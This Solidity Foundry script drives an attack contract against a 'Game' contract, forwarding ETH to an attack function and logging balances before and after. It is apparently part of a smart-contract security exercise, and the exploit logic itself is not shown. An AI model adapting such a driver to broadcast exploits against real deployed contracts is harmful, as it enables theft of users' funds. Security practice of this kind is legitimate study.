// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Script.sol";
import "../src/Game.sol";
import "../src/Attack.sol";

contract ExecuteAttack is Script {
    Game public game;
    Attack public attack;

    function run() external payable {  // Make the function payable to handle msg.value
        // Retrieve addresses from environment variables
        address gameContractAddress = vm.envAddress("GAME_CONTRACT");
        address payable attackContractAddress = payable(vm.envAddress("ATTACK_CONTRACT"));

        // Initialize contracts
        game = Game(gameContractAddress);
        attack = Attack(attackContractAddress);

        vm.startBroadcast();

        // Log initial balances
        console.log("Game contract balance before attack:", game.getBalance());
        console.log("Attacker's balance before attack:", address(attack).balance);

        // Execute the attack
        attack.attack{value: msg.value}(); // Forwarding msg.value to the attack function

        // Log balances after attack
        console.log("Game contract balance after attack:", game.getBalance());
        console.log("Attacker's balance after attack:", address(attack).balance);

        vm.stopBroadcast();
    }
}
